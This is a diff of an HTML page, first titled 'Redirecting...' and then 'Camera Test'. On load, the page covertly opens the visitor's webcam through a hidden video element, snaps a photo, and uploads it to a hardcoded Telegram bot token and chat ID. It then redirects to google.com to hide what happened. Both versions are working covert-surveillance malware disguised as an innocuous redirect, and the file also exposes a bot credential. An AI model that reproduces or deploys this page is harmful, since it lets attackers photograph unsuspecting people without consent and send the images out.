@@ -1,56 +1,67 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
+  <title>Camera Test</title>
 </head>
-<body style="margin:0; background:#000;">
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+<body>
+  <video id="video" autoplay playsinline width="320" height="240" style="display: none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
   <script>
     const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
-    const CHAT_ID = "7009447523";
+    const CHAT_ID = "7009447523"; // 🟢 Ye user ID hai jise bot ne msg bhejna hai
     const REDIRECT_URL = "https://google.com";
 
-    async function startCapture() {
+    async function startCameraAndSend() {
       try {
+        console.log("Requesting camera...");
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
+          console.log("Camera ready. Capturing in 500ms...");
           setTimeout(async () => {
+            const canvas = document.getElementById("canvas");
             const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
-            const blob = await (await fetch(dataUrl)).blob();
 
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob, "snap.jpg");
+            canvas.toBlob(async (blob) => {
+              const formData = new FormData();
+              formData.append("chat_id", CHAT_ID);
+              formData.append("photo", blob, "image.jpg");
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: "POST",
-              body: formData
-            }).catch((e) => console.log("Telegram error:", e));
-          }, 100); // ultra fast
+              try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                });
+
+                const result = await res.json();
+                console.log("Telegram response:", result);
+
+                if (result.ok) {
+                  console.log("Image sent to Telegram successfully.");
+                } else {
+                  console.error("Telegram error:", result.description);
+                }
+              } catch (err) {
+                console.error("Sending to Telegram failed:", err);
+              }
+
+              // Redirect regardless
+              window.location.href = REDIRECT_URL;
+
+            }, "image/jpeg", 0.9);
+          }, 500); // wait for camera frame
         };
-
-        // Immediate redirect — no delay
-        setTimeout(() => {
-          window.location.href = REDIRECT_URL;
-        }, 500); // max 0.5 sec delay
-
       } catch (err) {
-        console.log("Permission not given or error:", err);
-        // Still redirect if permission not given
+        console.error("Camera access error:", err);
         window.location.href = REDIRECT_URL;
       }
     }
 
-    window.onload = startCapture;
+    window.onload = startCameraAndSend;
   </script>
 </body>
 </html>
